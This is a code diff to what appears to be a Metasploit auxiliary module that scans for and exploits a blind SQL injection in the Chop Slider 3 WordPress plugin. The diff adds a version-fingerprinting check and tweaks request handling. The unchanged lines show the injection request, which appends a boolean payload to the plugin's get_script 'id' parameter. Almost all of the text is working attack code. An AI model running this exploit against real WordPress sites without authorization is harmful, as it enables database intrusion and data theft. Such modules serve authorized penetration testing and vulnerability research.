@@ -16,9 +16,9 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'WordPress ChopSlider3 id SQLi Scanner',
         'Description' => %q{
-          The iDangero.us Chop Slider 3 WordPress plugin prior to version 3.4
+          The iDangero.us Chop Slider 3 WordPress plugin version 3.4 and prior
           contains a blind SQL injection in the id parameter of the
-          get_sript/index.php page.  The injection is passed through GET
+          get_script/index.php page.  The injection is passed through GET
           parameters, and thus must be encoded,
           and magic_quotes is applied at the server.
         },
@@ -47,15 +47,33 @@ class MetasploitModule < Msf::Auxiliary
     ]
   end
 
+  def check
+    res = send_request_raw({
+      'method' => 'GET',
+      'uri' => target_uri.path
+    })
+    fail_with Failure::Unreachable, 'Connection failed' unless res
+    if res && res.body =~ /idangerous.chopslider-(\d\.\d).css-css/
+      v = Gem::Version.new(Regexp.last_match(1))
+      print_status "Version detected: #{v}"
+      if v <= Gem::Version.new('3.4')
+        return Msf::Exploit::CheckCode::Appears
+      end
+    end
+    Msf::Exploit::CheckCode::Unknown
+  end
+
   def run_host(ip)
     unless wordpress_and_online?
       vprint_error('Server not online or not detected as wordpress')
       return
     end
 
-    checkcode = check_plugin_version_from_readme('chopslider', '3.4')
-    if checkcode == Msf::Exploit::CheckCode::Safe
-      vprint_error('ChopSlider3 version not vulnerable')
+    # this didn't come with a readme file
+    # checkcode = check_plugin_version_from_readme('chopslider', '3.4')
+
+    if check == Msf::Exploit::CheckCode::Unknown
+      vprint_error('ChopSlider3 version not vulnerable or undetected')
       return
     else
       print_good('Vulnerable version detected')
@@ -72,7 +90,7 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_raw({
         'method' => 'GET',
         'uri' => "#{normalize_uri(target_uri.path, 'wp-content', 'plugins', 'chopslider', 'get_script', 'index.php')}?id=#{sliderid}%20OR%20#{rand(0..10)}<>#{rand(11..1000)}%20AND%20#{payload}"
-      })
+      }, 20, true)
       fail_with Failure::Unreachable, 'Connection failed' unless res
     end
 
